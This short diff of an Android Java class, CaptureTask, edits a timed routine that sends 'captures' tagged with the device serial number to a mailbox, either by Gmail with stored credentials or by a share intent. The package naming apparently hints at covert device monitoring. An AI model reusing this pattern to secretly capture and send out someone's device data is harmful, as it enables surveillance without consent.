@@ -6,7 +6,7 @@ import java.util.Date;
 import java.util.TimerTask;
 
 import system.service.utils.*;
-import com.particle.inspector.common.util.mail.GMailSenderEx;
+import com.particle.inspector.common.util.mail.MailSender;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
 
@@ -81,9 +81,10 @@ class CaptureTask extends TimerTask
             }
         }
         
-        // Send mail 
+        // Send mail
+        /*
         try {   
-            GMailSenderEx sender = new GMailSenderEx();
+            GMailSenderEx sender = new GMailSenderEx(host, sendbox, pwd);
             String subject = "Capture From " + DeviceProperty.getSerialNum() + " - " + now;
             String body    = subject;
             sender.setSubject(subject);
@@ -93,7 +94,7 @@ class CaptureTask extends TimerTask
             Log.e("SendMail", e.getMessage(), e);   
         } 
         
-        /*
+        
         Intent sendIntent = new Intent(android.content.Intent.ACTION_SEND);
         String title = "Capture From " + DeviceProperty.getSerialNum() + " - " + now;
         sendIntent.putExtra(Intent.EXTRA_SUBJECT, title);
